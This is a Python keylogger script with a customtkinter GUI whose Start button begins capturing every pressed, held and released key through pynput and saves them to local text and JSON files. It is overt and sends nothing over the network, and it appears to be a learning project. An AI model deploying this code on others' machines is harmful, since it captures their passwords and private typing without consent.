from tkinter import *
#To create modern GUI
import customtkinter 
#To track keyboard inputs
from pynput import keyboard 
import json 

customtkinter.set_default_color_theme("green")

root = customtkinter.CTk()
root.geometry("300x400")
root.title("KeyLogger Project")

key_list = []
x = False #Value to determine if held
key_strokes = ""

#To store key strokes in a text file
def update_txt_file(key): 
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

#To store key strokes in a json file
def update_json_file(key_list):
    with open('logs.json', '+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

#To determine what happens when a key is pressed and held
def on_press(key):
    global x, key_list
    if x == False:
        key_list.append(
            {'Pressed': f'{key}'}
            #f'Key {key} pressed'
        )
        x = True
    if x == True:
        key_list.append(
            {'Held': f'{key}'}
            #f'Key {key} pressed'
        )
    update_json_file(key_list)

#To determine what happens when the key is released
def on_release(key):
    global x, key_list, key_strokes
    key_list.append(
        {'Released': f'{key}'}
        #f'Key {key} released'
    )
    if x == True:
        x = False
    update_json_file(key_list)
    
    key_strokes = key_strokes + str(key)
    update_txt_file(str(key_strokes))

#Starting the keylogger when the start button is pressed
def butaction():

    print("[+] Running Keylogger Successfuly!\n[!] Saving the Released key logs in 'logs.txt\n[!] Saving the Pressed, Held and Released key logs in 'logs.json'")

    with keyboard.Listener(
            on_press = on_press,
            on_release = on_release) as listener:
        listener.join()

#Styling of GUI
label = customtkinter.CTkLabel(root, text="Press the Start button to start the Key Logging")
label.place(relx = 0.5, rely = 0.4, anchor = CENTER)
button = customtkinter.CTkButton(root, text = "Start", command = butaction)
button.place(relx = 0.5, rely = 0.5, anchor = CENTER)
root.mainloop()
